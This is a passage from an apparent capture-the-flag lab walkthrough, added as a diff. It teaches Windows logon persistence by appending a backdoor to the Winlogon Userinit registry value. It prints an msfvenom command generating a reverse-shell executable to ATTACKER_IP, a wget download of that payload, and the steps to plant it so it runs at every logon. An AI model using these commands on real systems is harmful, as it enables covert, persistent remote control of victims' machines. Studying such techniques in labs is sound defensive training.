@@ -1,0 +1,30 @@
+Winlogon:
+
+Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).
+
+Winlogon uses some registry keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ that could be interesting to gain persistence:
+
+Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
+shell points to the system's shell, which is usually explorer.exe.
+Winlogon registry
+
+If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.
+
+Let's start by creating a shell:
+
+AttackBox
+user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
+We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. 
+
+     Windows Powershell:
+        -wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
+
+Command Prompt
+C:\> move revshell.exe C:\Windows
+We then alter either shell or Userinit in HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\. In this case we will use Userinit, but the procedure with shell is the same.
+
+Note: While both shell and Userinit could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use Userinit.
+
+Backdoored userinit
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
